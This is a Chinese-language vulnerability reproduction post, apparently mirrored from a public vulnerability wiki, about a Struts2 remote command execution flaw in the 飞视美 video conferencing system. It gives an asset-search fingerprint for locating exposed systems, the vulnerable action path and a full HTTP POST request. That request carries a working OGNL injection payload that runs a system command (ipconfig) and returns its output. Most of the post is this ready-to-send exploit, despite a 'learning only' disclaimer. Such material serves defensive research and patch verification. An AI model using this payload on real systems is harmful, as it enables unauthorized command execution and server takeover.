---
title: "飞视美 视频会议系统 Struts2 远程命令执行漏洞"
date: 2026-10-16 09:11:53
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "飞视美-视频会议系统-Struts2"
tags:
  - "飞视美-视频会议系统-Struts2"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

飞视美 视频会议系统 Struts2组件存在远程命令执行漏洞，通过漏洞攻击者可执行任意命令获取服务器权限

## 漏洞影响

```
飞视美 视频会议系统
```

## 网络测绘

```
app="飞视美-视频会议系统"
```

## 漏洞复现

登录页面

![image-20220525152447274](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251524392.png)

存在漏洞的路径为

```
/confinfoaction!showallConfinfos.action
```

发送请求包

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /confinfoaction!showallConfinfos.action HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 669
Host: 
Connection: Keep-Alive

('\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&amp;('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\43mycmd\75\'ipconfig\'')(d))&amp;(h)(('\43myret\75@java.lang.Runtime@getRuntime().&#101;xec(\43mycmd)')(d))&amp;(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&amp;(j)(('\43myres\75new\40byte[51020]')(d))&amp;(k)(('\43mydat.readFully(\43myres)')(d))&amp;(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&amp;(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(n)(('\43myout.getWriter().println(\43mystr)')(d))</code></pre>

</details>

![image-20220525152728933](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251527012.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-Struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
